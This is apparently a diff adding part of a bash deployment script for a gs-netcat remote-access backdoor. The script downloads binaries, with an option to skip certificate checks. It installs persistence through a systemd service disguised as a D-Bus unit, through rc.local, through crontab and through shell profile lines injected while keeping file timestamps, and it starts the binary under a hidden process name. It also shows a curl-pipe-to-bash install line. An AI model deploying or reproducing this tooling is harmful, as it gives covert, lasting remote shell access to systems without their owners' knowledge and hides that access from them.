+# Try to load a GS_SECRET
+gs_secret_reload()
+{
+	# DEBUGF "${CG}secret_load(${1})${CN}"
+	[[ -n $GS_SECRET_FROM_FILE ]] && return
+	[[ ! -f "$1" ]] && return
+
+	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
+	local sec
+	sec=$(<"$1")
+	[[ ${#sec} -lt 4 ]] && return
+	WARN "Using existing secret from '${1}'"
+	if [[ ${#sec} -lt 10 ]]; then
+		WARN "SECRET in '${1}' is very short! (${#sec})"
+	fi
+	GS_SECRET_FROM_FILE=$sec
+}
+
+gs_secret_write()
+{
+	mk_file "$1" || return
+	echo "$GS_SECRET" >"$1" || return
+}
+
+
+install_system_systemd()
+{
+	[[ ! -d "${SERVICE_DIR}" ]] && return
+	command -v systemctl >/dev/null || return
+	# test for:
+	# 1. offline
+	# 2. >&2 Failed to get D-Bus connection: Operation not permitted <-- Inside docker
+	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && return
+	if [[ -f "${SERVICE_FILE}" ]]; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
+			IS_GS_RUNNING=1
+		fi
+		IS_SYSTEMD=1
+		SKIP_OUT "${SERVICE_FILE} already exists."
+		return
+	fi
+
+	# Create the service file
+	mk_file "${SERVICE_FILE}" || return
+	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
+	echo "[Unit]
+Description=D-Bus System Connection Bus
+After=network.target
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=300
+WorkingDirectory=/root
+ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
+
+[Install]
+WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
+
+	gs_secret_write "$SYSTEMD_SEC_FILE"
+	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
+	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
+
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } # did not work... 
+
+	IS_SYSTEMD=1
+	((IS_INSTALLED+=1))
+}
+
+
+# inject a string ($2-) into the 2nd line of a file and retain the
+# PERM/TIMESTAMP of the target file ($1)
+install_to_file()
+{
+	local fname="$1"
+
+	shift 1
+
+	# If file does not exist then create with oldest TS
+	mk_file "$fname" || return
+
+	D="$(IFS=$'\n'; head -n1 "${fname}" && \
+		echo "${*}" && \
+		tail -n +2 "${fname}")"
+	echo 2>/dev/null "$D" >"${fname}" || return
+
+	true
+}
+
+install_system_rclocal()
+{
+	[[ ! -f "${RCLOCAL_FILE}" ]] && return
+	# Some systems have /etc/rc.local but it's not executeable...
+	[[ ! -x "${RCLOCAL_FILE}" ]] && return
+	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
+		return	
+	fi
+
+	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
+	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
+
+	install_to_file "${RCLOCAL_FILE}" "$NOTE_DONOTREMOVE" "$RCLOCAL_LINE"
+
+	gs_secret_write "$RCLOCAL_SEC_FILE"
+
+	((IS_INSTALLED+=1))
+}
+
+install_system()
+{
+	echo -en "Installing systemwide remote access permanentally....................."
+
+	# Try systemd first
+	install_system_systemd
+
+	# Try good old /etc/rc.local
+	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal
+
+	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
+
+	[[ -n $IS_SKIPPED ]] && return
+	
+	OK_OUT
+}
+
+install_user_crontab()
+{
+	command -v crontab >/dev/null || return # no crontab
+	echo -en "Installing access via crontab........................................."
+	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already installed in crontab."
+		return
+	fi
+
+	[[ $UID -eq 0 ]] && {
+		mk_file "${CRONTAB_DIR}/root"
+	}
+
+	local old
+	old="$(crontab -l 2>/dev/null)" || {
+		# Create empty crontab (busybox) if no crontab exists at all.
+		crontab - </dev/null &>/dev/null
+	}
+	[[ -n $old ]] && old+=$'\n'
+
+	echo -e "${old}${NOTE_DONOTREMOVE}\n0 * * * * $CRONTAB_LINE" | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }
+
+	((IS_INSTALLED+=1))
+	OK_OUT
+}
+
+install_user_profile()
+{
+	local rc_filename_status
+	local rc_file
+	local rc_filename
+
+	rc_filename="$1"
+	rc_filename_status="${rc_filename}................................"
+	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"
+
+	echo -en "Installing access via ~/${rc_filename_status:0:15}..............................."
+	if [[ -f "${rc_file}" ]] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already installed in ${rc_file}"
+		return
+	fi
+
+	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}" || { SKIP_OUT "${CDR}Permission denied:${CN} ~/${rc_filename}"; false; return; }
+
+	((IS_INSTALLED+=1))
+	OK_OUT
+}
+
+install_user()
+{
+	# Use crontab if it's not in systemd (but might be in rc.local).
+	if [[ ! $OSTYPE == *darwin* ]]; then
+		install_user_crontab
+	fi
+
+	[[ $IS_INSTALLED -ge 2 ]] && return
+	# install_user_profile
+	for x in "${RC_FN_LIST[@]}"; do
+		install_user_profile "$x"
+	done
+	gs_secret_write "$USER_SEC_FILE" # Create new secret file
+}
+
+ask_nocertcheck()
+{
+	WARN "Can not verify host. CA Bundle is not installed."
+	echo >&2 "--> Attempting without certificate verification."
+	echo >&2 "--> Press any key to continue or CTRL-C to abort..."
+	echo -en >&2 "--> Continuing in "
+	local n
+
+	n=10
+	while :; do
+		echo -en >&2 "${n}.."
+		n=$((n-1))
+		[[ $n -eq 0 ]] && break 
+		read -r -t1 -n1 && break
+	done
+	[[ $n -gt 0 ]] || echo >&2 "0"
+
+	GS_NOCERTCHECK=1
+}
+
+# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
+# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
+dl_ssl()
+{
+	local cmd sslerr arg_nossl
+	cmd="$3"
+	sslerr="$2"
+	arg_nossl="$1"
+
+	shift 3
+	if [[ -z $GS_NOCERTCHECK ]]; then
+		DL_ERR="$("$cmd" "$@" 2>&1 1>/dev/null)"
+		[[ "${DL_ERR}" != *"$sslerr"* ]] && return
+	fi
+
+	FAIL_OUT "Certificate Error."
+	[[ -z $GS_NOCERTCHECK ]] && ask_nocertcheck
+	[[ -z $GS_NOCERTCHECK ]] && return
+
+	echo -en "--> Downloading binaries without certificate verification............."
+	DL_ERR="$("$cmd" "$arg_nossl" "$@" 2>&1 1>/dev/null)"
+}
+
+# Download $1 and save it to $2
+dl()
+{
+	# Debugging / testing. Use local package if available
+	if [[ -n "$GS_USELOCAL" ]]; then
+		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
+		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
+		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null && return
+		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
+		errexit
+	fi
+
+	# Delete. Maybe previous download failed.
+	[[ -s "$2" ]] && rm -f "${2:?}"
+
+	if [[ -n $IS_USE_CURL ]]; then
+		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
+	elif [[ -n $IS_USE_WGET ]]; then
+		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "CAN NOT HAPPEN"
+		errexit
+	fi
+
+	# Download failed:
+	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_ERR"; exit_code 255; } 
+}
+
+# S= was set. Do not install but execute in place.
+gs_access()
+{
+	echo -e "Connecting..."
+	local ret
+	GS_SECRET="${S}"
+
+	"${DSTBIN}" -s "${GS_SECRET}" -i
+	ret=$?
+	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
+	[[ $ret -eq 61 ]] && {
+		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
+		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
+		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+	}
+
+	exit_code "$ret"
+}
+
+# Binary is in an executeable directory (no noexec-flag)
+# set IS_TESTBIN_OK if binary worked.
+# test_bin <binary>
+test_bin()
+{
+	local bin
+	unset IS_TESTBIN_OK
+
+	bin="$1"
+
+	# Try to execute the binary
+	unset ERR_LOG
+	GS_OUT=$("$bin" -g 2>&1)
+	ret=$?
+	[[ $ret -ne 0 ]] && {
+		# 126 - Exec format error
+		FAIL_OUT
+		ERR_LOG="$GS_OUT"
+		WARN_EXECFAIL_SET "$ret" "wrong binary"
+		return
+	}
+
+	# Use randomly generated secret unless it's set already (X=)
+	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
+
+	IS_TESTBIN_OK=1
+}
+
+test_network()
+{
+	local ret
+	unset IS_TESTNETWORK_OK
+
+	# There should be no GS-NETCAT listening.
+	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-netcat try the connection.
+	# 1. Exit=0 immediatly if server exists.
+	# 2. Exit=202 after n seconds. Firewalled/DNS?
+	# 3. Exit=203 if TCP to GSRN is refused.
+	# 3. Exit=61 on GS-Connection refused. (server does not exist)
+	# Do not need GS_ENV[*] here because all env variables are exported
+	# when exec is used.
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	ret=$?
+
+	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
+	[[ $ret -eq 139 ]] && { 
+		ERR_LOG=""
+		WARN_EXECFAIL_SET "$ret" "SIGSEGV"
+		return
+	}
+
+	{ [[ $ret -eq 202 ]] || [[ $ret -eq 203 ]]; } && {
+		# 202 - Timeout (alarm)
+		# 203 - TCP connection refused
+		FAIL_OUT
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+		# EXIT if we can not check if SECRET has already been used.
+		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 7350 or 67."
+	}
+
+	# Pre <= 1.4.40 return with 255 if transparent proxy resets connection after 12 sec.
+	# >1.4.40 return 203 (NETERROR)
+	[[ $ret -eq 255 ]] && {
+		# Connect reset by peer
+		FAIL_OUT
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+		errexit "A transparent proxy has been detected. Try GS_PORT=53 or 22,7350 or 67."
+	}
+
+	[[ $ret -eq 0 ]] && {
+		FAIL_OUT "Secret '${GS_SECRET}' is already used."
+		HOWTO_CONNECT_OUT
+		exit_code 0
+	}
+
+	# Fail _unless_ it's ECONNREFUSED
+	[[ $ret -eq 61 ]] && {
+		# HERE: ECONNREFUSED
+		# Connection to GSRN was successfull and GSRN reports
+		# that no server is listening.
+		# This is a good enough test that this network & binary is working.
+		IS_TESTNETWORK_OK=1
+		return
+	}
+
+	# Unknown error condition
+	WARN_EXECFAIL_SET "$ret" "default pkg failed"
+}
+
+do_webhook()
+{
+	local arr
+	local IFS
+	local str
+
+	IFS=""
+	# Expand any $SECRET variable, etc.
+	while [[ $# -gt 0 ]]; do
+		# We need to escape all " to "'"'" to pass 'eval' correctly.
+		# (Note: This _WILL_ expand $-style variables - what we want)
+		# shellcheck disable=SC2001 # Use bash.4.0 features =>  not portable
+		# str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
+		str="${1//\"/\"'\"'\"}"
+        eval str=\""$str"\"
+		arr+=("$str")
+		shift 1
+	done
+
+	# echo "arr=${#arr[@]}: ${arr[@]}"
+	"${arr[@]}"
+}
+
+webhooks()
+{
+	local arr
+	local ok
+	local err
+
+	echo -en "Executing webhooks...................................................."
+	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
+	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
+
+	if [[ -n $IS_USE_CURL ]]; then
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"requested URL returned error: 404"* ]] && ok=1
+	elif [[ -n $IS_USE_WGET ]]; then
+		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" 2>&1)" && ok=1
+		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"ERROR 404: Not Found"* ]] && ok=1
+	fi
+	[[ -n $ok ]] && { OK_OUT; return; }
+
+	FAIL_OUT
+}
+
+try_network()
+{
+	echo -en "Testing Global Socket Relay Network..................................."
+	test_network
+	[[ -n "$IS_TESTNETWORK_OK" ]] && { OK_OUT; return; }
+
+	FAIL_OUT
+	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+	WARN_EXECFAIL
+}
+
+# try <osarch> <srcpackage>
+try()
+{
+	local osarch="$1"
+	local src_pkg="$2"
+
+	[[ -z "$src_pkg" ]] && src_pkg="gs-netcat_${osarch}.tar.gz"
+	echo -e "--> Trying ${CG}${osarch}${CN}"
+	# Download binaries
+	echo -en "Downloading binaries.................................................."
+	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
+	OK_OUT
+
+	echo -en "Unpacking binaries...................................................."
+	if [[ "${src_pkg}" == *.tar.gz ]]; then
+		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
+		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
+		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
+		[[ -n $GS_USELOCAL_GSNC ]] && {
+			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
+			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
+		}
+	else
+		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
+	fi
+	OK_OUT
+
+	echo -en "Copying binaries......................................................"
+	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+	chmod 700 "$DSTBIN"
+	OK_OUT
+
+	echo -en "Testing binaries......................................................"
+	test_bin "${DSTBIN}"
+	if [[ -n "$IS_TESTBIN_OK" ]]; then
+		OK_OUT
+		return
+	fi
+
+	rm -f "${TMPDIR}/${src_pkg:?}"
+}
+
+gs_start_systemd()
+{
+	# HERE: It's systemd
+	if [[ -z "$IS_GS_RUNNING" ]]; then
+		# Resetting the Timestamp will yield a systemctl status warning that daemon-reload
+		# is needed. Thus fix Timestamp here and reload.
+		clean_all
+		systemctl daemon-reload
+		systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
+		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
+			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
+			exit_code 255
+		fi
+		IS_GS_RUNNING=1
+		OK_OUT
+		return
+	fi
+
+	SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
+}
+
+gs_start()
+{
+	# If installed as systemd then try to start it
+	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
+	[[ -n "$IS_GS_RUNNING" ]] && return
+
+	# Scenario to consider:
+	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-dbus'
+	# ./deploy.sh -> re-installs new secret. Start gs-dbus with _new_ secret.
+	# Now two gs-dbus's are running (which is correct)
+	if [[ -n "$KL_CMD" ]]; then
+		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+	elif command -v pidof >/dev/null; then
+		# if no pkill/killall then try pidof (but we cant tell which user...)
+		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
+			IS_OLD_RUNNING=1
+		fi
+	fi
+	IS_NEED_START=1
+
+	if [[ -n "$IS_OLD_RUNNING" ]]; then
+		# HERE: OLD is already running.
+		if [[ -n "$IS_SKIPPED" ]]; then
+			# HERE: Already running. Skipped installation (sec.dat has not changed).
+			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
+			unset IS_NEED_START
+		else
+			# HERE: sec.dat has been updated
+			OK_OUT
+			WARN "More than one ${PROC_HIDDEN_NAME} is running."
+			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
+			[[ -n $OLD_PIDS ]] && echo -e "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
+		fi
+	else
+		OK_OUT ""
+	fi
+
+	if [[ -n "$IS_NEED_START" ]]; then
+		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
+		# and then executed.
+		# This wont work:
+		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
+		# This does work:
+		#     FOO="X=1" && (eval $FOO id)
+		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
+		IS_GS_RUNNING=1
+	fi
+}
+
+init_vars
+
+[[ "$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
+[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
+
+init_setup
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
+[[ -n "$X" ]] && GS_SECRET_X="$X"
+
+if [[ -z $S ]]; then
+	# HERE: S= is NOT set
+	if [[ $UID -eq 0 ]]; then
+		gs_secret_reload "$SYSTEMD_SEC_FILE" 
+		gs_secret_reload "$RCLOCAL_SEC_FILE" 
+	fi
+	gs_secret_reload "$USER_SEC_FILE"
+
+	if [[ -n $GS_SECRET_FROM_FILE ]]; then
+		GS_SECRET="${GS_SECRET_FROM_FILE}"
+	else
+		GS_SECRET="${GS_SECRET_X}"
+	fi
+
+	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
+else
+	GS_SECRET="$S"
+	URL_BIN="$URL_BIN_FULL"
+fi
+
+try "$OSARCH" "$SRC_PKG"
+
+# [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
+WARN_EXECFAIL
+[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
+
+[[ -z $S ]] && try_network
+# [[ -n "$GS_UPDATE" ]] && gs_update
+
+# S= is set. Do not install but connect to remote using S= as secret.
+[[ -n "$S" ]] && gs_access
+
+# -----BEGIN Install permanentally-----
+if [[ -z $GS_NOINST ]]; then
+	if [[ -n $IS_DSTBIN_TMP ]]; then
+		echo -en "Installing remote access.............................................."
+		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
+	else
+		# Try to install system wide. This may also start the service.
+		[[ $UID -eq 0 ]] && install_system
+
+		# Try to install to user's login script or crontab (if not installed as SYSTEMD)
+		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
+	fi
+else
+	echo -e "GS_NOINST is set. Skipping installation."
+fi
+# -----END Install permanentally-----
+
+if [[ -z "$IS_INSTALLED" ]] || [[ -n $IS_DSTBIN_TMP ]]; then
+	echo -e >&2 "--> ${CR}Access will be lost after reboot.${CN}"
+fi
+	
+[[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
+
+webhooks
+
+HOWTO_CONNECT_OUT
+
+printf "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
+if [[ -n "$GS_NOSTART" ]]; then
+	SKIP_OUT "GS_NOSTART=1 is set."
+else
+	gs_start
+fi
+
+echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
+
+exit_code 0
